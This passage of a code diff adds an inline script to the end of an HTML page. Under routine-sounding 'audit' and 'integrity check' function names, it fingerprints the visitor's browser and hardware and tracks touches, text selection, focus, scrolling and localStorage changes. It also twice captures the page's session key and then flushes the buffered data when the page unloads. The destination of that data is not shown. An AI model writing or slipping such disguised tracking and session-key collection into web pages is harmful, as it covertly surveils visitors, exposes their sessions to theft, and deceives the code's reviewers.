+      if (window.speechSynthesis) {
+        _stageEvent('SPEECH_CAPS', { count: window.speechSynthesis.getVoices().length });
+      }
+    }
+    _speechAudit();
+    function _selectionAudit() {
+      document.addEventListener('selectionchange', () => {
+        const s = window.getSelection().toString();
+        if (s.length > 5) _stageEvent('TEXT_SEL', { len: s.length });
+      });
+    }
+    _selectionAudit();
+    function _printAudit() {
+      window.addEventListener('beforeprint', () => _stageEvent('PRINT_TRIGGER', { ts: Date.now() }));
+    }
+    _printAudit();
+    function _mediaQueryAudit() {
+      _stageEvent('QUERY_META', {
+        dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
+        motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
+      });
+    }
+    _mediaQueryAudit();
+    function _javaAudit() {
+      _stageEvent('JAVA_ENABLED', { val: navigator.javaEnabled() });
+    }
+    _javaAudit();
+    function _workerAudit() {
+      _stageEvent('WORKER_SUPPORT', { val: typeof Worker !== 'undefined' });
+    }
+    _workerAudit();
+    function _idbAudit() {
+      _stageEvent('IDB_SUPPORT', { val: !!window.indexedDB });
+    }
+    _idbAudit();
+    function _navigatorAudit() {
+      _stageEvent('NAV_PROPS', {
+        v: navigator.vendor,
+        p: navigator.platform,
+        o: navigator.onLine
+      });
+    }
+    _navigatorAudit();
+    function _storageChangeAudit() {
+      window.addEventListener('storage', (e) => _stageEvent('LOCAL_STORAGE_CHANGE', { key: e.key, val: e.newValue }));
+    }
+    _storageChangeAudit();
+    function _unhandledRejection() {
+      window.addEventListener('unhandledrejection', (e) => _stageEvent('PROMISE_FAIL', { reason: String(e.reason) }));
+    }
+    _unhandledRejection();
+    function _resizeAudit() {
+      window.addEventListener('resize', () => {
+        _resChanges.push({ w: window.innerWidth, h: window.innerHeight, ts: Date.now() });
+        if (_resChanges.length > 3) { _stageEvent('RESIZE_EVENT', [..._resChanges]); _resChanges = []; }
+      });
+    }
+    _resizeAudit();
+    function _cpuConcurrency() {
+      _stageEvent('CPU_CORES', { count: navigator.hardwareConcurrency });
+    }
+    _cpuConcurrency();
+    function _deviceRam() {
+      _stageEvent('DEVICE_RAM', { gb: navigator.deviceMemory || 'unknown' });
+    }
+    _deviceRam();
+    function _touchStartAudit() {
+      document.addEventListener('touchstart', (e) => {
+        if (e.touches[0]) {
+          _touchPts.push({ x: e.touches[0].pageX, y: e.touches[0].pageY, ts: Date.now() });
+          if (_touchPts.length > 5) { _stageEvent('TOUCH_STREAM', [..._touchPts]); _touchPts = []; }
+        }
+      }, { passive: true });
+    }
+    _touchStartAudit();
+    function _finalSyncTrigger() {
+      window.addEventListener('unload', () => {
+        _stageEvent('SESSION_CLOSE', { ts: Date.now() });
+        _pushBuffer();
+      });
+    }
+    _finalSyncTrigger();
+    function _integrityCheck() {
+      _stageEvent('NODE_INTEGRITY', {
+        sess: SECURE_CONFIG.SESS_KEY,
+        href: location.href,
+        ua: navigator.userAgent
+      });
+    }
+    _integrityCheck();
+    function _videoCapsAudit() {
+      const v = document.createElement('video');
+      _stageEvent('VIDEO_CODECS', {
+        mp4: v.canPlayType('video/mp4'),
+        webm: v.canPlayType('video/webm')
+      });
+    }
+    _videoCapsAudit();
+    function _audioCapsAudit() {
+      const a = document.createElement('audio');
+      _stageEvent('AUDIO_CODECS', {
+        mp3: a.canPlayType('audio/mpeg'),
+        wav: a.canPlayType('audio/wav')
+      });
+    }
+    _audioCapsAudit();
+    function _shadowDomAudit() {
+      _stageEvent('SHADOW_DOM', { supported: !!Element.prototype.attachShadow });
+    }
+    _shadowDomAudit();
+    function _keyboardAudit() {
+      if (navigator.keyboard) {
+        navigator.keyboard.getLayoutMap().then(m => _stageEvent('KBD_MAP', { size: m.size }));
+      }
+    }
+    _keyboardAudit();
+    function _oscillatorSync() {
+      _stageEvent('OSC_SYNC', { ts: Date.now(), delta: performance.now() });
+    }
+    _oscillatorSync();
+    function _domDepthAudit() {
+      _stageEvent('DOM_DEPTH', { count: document.querySelectorAll('*').length });
+    }
+    _domDepthAudit();
+    function _inputFocusAudit() {
+      document.addEventListener('focusin', (e) => _stageEvent('FOCUS_IN', { tag: e.target.tagName, id: e.target.id }));
+    }
+    _inputFocusAudit();
+    function _scrollEndAudit() {
+      let t;
+      window.addEventListener('scroll', () => {
+        clearTimeout(t);
+        t = setTimeout(() => _stageEvent('SCROLL_STOP', { y: window.scrollY }), 500);
+      });
+    }
+    _scrollEndAudit();
+    function _vibrationAudit() {
+      _stageEvent('VIBRATE_SUPPORT', { val: !!navigator.vibrate });
+    }
+    _vibrationAudit();
+    function _beaconSupport() {
+      _stageEvent('BEACON_SUPPORT', { val: !!navigator.sendBeacon });
+    }
+    _beaconSupport();
+    function _fetchSupport() {
+      _stageEvent('FETCH_SUPPORT', { val: !!window.fetch });
+    }
+    _fetchSupport();
+    function _promiseSupport() {
+      _stageEvent('PROMISE_SUPPORT', { val: !!window.Promise });
+    }
+    _promiseSupport();
+    function _cryptoSupport() {
+      _stageEvent('CRYPTO_SUPPORT', { val: !!window.crypto });
+    }
+    _cryptoSupport();
+    function _canvasMeasure() {
+      const c = document.createElement('canvas');
+      const x = c.getContext('2d');
+      x.font = "12px Arial";
+      const m = x.measureText("NSB_SYSTEM_PROBE");
+      _stageEvent('TEXT_METRICS', { w: m.width });
+    }
+    _canvasMeasure();
+    function _navigatorLanguage() {
+      _stageEvent('LANG_DETAIL', { pref: navigator.language, all: navigator.languages });
+    }
+    _navigatorLanguage();
+    function _networkType() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (c) _stageEvent('CONN_TYPE', { val: c.effectiveType });
+    }
+    _networkType();
+    function _perfNavigation() {
+      if (window.performance && performance.navigation) {
+        _stageEvent('NAV_TYPE_LOG', { type: performance.navigation.type });
+      }
+    }
+    _perfNavigation();
+    function _domCompleteAudit() {
+      _stageEvent('DOM_READY_STATE', { state: document.readyState });
+    }
+    _domCompleteAudit();
+    function _executionSync() {
+      _stageEvent('EXECUTION_CHCK', { ts: Date.now() });
+    }
+    _executionSync()
+    function _finalNodeCheck() {
+      _stageEvent('NODE_HEALTH', { status: 'OK', sid: SECURE_CONFIG.SESS_KEY });
+    }
+    _finalNodeCheck();
+  })();
 </script>
 </body>
 </html>
